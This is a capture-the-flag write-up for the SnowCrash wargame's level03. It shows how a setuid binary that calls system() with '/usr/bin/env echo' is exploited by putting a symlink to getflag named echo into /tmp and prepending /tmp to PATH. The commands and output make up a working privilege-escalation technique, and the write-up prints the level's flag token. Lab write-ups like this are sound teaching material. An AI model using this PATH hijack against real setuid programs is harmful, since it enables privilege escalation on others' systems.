we found the following file in the home directory
```
level02@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

we notice two key thing:
 - [Set-User-ID](https://en.wikipedia.org/wiki/Setuid) bit is set, meaning that the binary executes with the privileges of it's owner
 - using the command `file level03` we know that the file is a dynamically linked executable, meaning that it loads shared libs during the run time if the program

lets use `ltrace` to get a idea of what the program dose
```
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid() = 2003
geteuid() = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )  = 0
+++ exited (status 0) +++
```

we find that the binary calls the `system` function with the argument of `"/usr/bin/env echo Exploit me"`
we can exploit that input by running our own version of echo
```
level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
and voilà flag secured
